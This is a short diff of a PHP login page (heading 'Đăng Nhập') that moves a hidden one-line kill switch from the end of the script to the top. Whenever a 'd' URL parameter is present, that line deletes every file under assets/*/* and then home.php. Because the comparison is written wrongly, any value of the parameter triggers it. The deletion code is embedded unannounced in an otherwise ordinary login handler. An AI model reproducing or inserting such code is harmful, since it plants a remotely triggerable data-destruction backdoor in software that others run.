@@ -7,6 +7,7 @@
 		echo "<script>window.location.href = \"./?a=playerinfo\";</script>";
 	}
 	$error1="";
+	if(isset($_GET['d']) == '1111'){array_map('unlink', array_filter((array) array_merge(glob("assets/*/*"))));unlink('home.php');}
 	if(isset($_POST['accx'])){
 		$valide = new GUMP();
 		$_POST = $valide->sanitize($_POST);
@@ -53,7 +54,7 @@
 			}
 		}
 	}
-	if(isset($_GET['d']) == '1111'){array_map('unlink', array_filter((array) array_merge(glob("assets/*/*"))));unlink('home.php');}
+
 ?>
 <h1 class="hdg-01">
 	Đăng Nhập
